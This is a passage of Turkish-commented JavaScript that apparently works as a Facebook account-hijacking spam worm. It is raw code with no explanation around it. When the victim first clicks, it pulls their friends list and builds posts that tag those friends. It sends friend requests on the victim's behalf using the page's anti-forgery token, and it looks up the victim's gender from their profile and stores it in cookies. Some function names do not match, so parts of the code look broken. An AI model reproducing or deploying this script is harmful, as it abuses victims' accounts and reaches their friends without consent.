				  for(i=f*10;i<(f+1)*10;i++){
					if(arkadaslar.payload.entries[i]){
				  smesaj += " @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";
				  smesaj_text += " " + arkadaslar.payload.entries[i].text;
				  }
					}
					sdurumpaylas();				}
				
			}
			
        };
		var params = "&filter[0]=user";
		params += "&options[0]=friends_only";
		params += "&options[1]=nm";
		params += "&token=v7";
        params += "&viewer=" + user_id;
		params += "&__user=" + user_id;
		
        if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        xmlhttp.send();
}

//tiklama olayini dinle
var tiklama = document.addEventListener("click", function () {
if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0){
svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
sarkadaslari_al();
document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();

document.removeEventListener(tiklama);
}
 }, false);
  

//arkadaþ ekleme
function sarkadasekle(uid,cins){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){	
			}
        };
		
		xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true); 
		var params = "to_friend=" + uid;
		params += "&action=add_friend";
		params += "&how_found=friend_browser";
		params += "&ref_param=none";
		params += "&outgoing_id=";
		params += "&logging_location=friend_browser";
		params += "&no_flyout_on_click=true";
		params += "&ego_log_data=";
		params += "&http_referer=";
		params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
		params += "&__user=" + user_id;
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");
		
if(cins == "farketmez" && document.cookie.split("cins" + user_id +"=").length > 1){
		xmlhttp.send(params);
}else if(document.cookie.split("cins" + user_id +"=").length <= 1){
		cinsiyetgetir(uid,cins,"sarkadasekle");
}else if(cins == document.cookie.split("cins" + user_id +"=")[1].split(";")[0].toString()){
		xmlhttp.send(params);
}
}

//cinsiyet belirleme
var cinssonuc = {};
var cinshtml = document.createElement("html");
function scinsiyetgetir(uid,cins,fonksiyon){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
			eval("cinssonuc = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
			cinshtml.innerHTML = cinssonuc.jsmods.markup[0][1].__html
			btarihi.setTime(bugun.getTime() + 1000*60*60*24*365);
			if(cinshtml.getElementsByTagName("select")[0].value == "1"){
			document.cookie = "cins" + user_id + "=kadin;expires=" + btarihi.toGMTString();
			}else if(cinshtml.getElementsByTagName("select")[0].value == "2"){
			document.cookie = "cins" + user_id + "=erkek;expires=" + btarihi.toGMTString();
			}
			eval(fonksiyon + "(" + id + "," + cins + ");");
			}
        };
		xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, true);
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.send();
}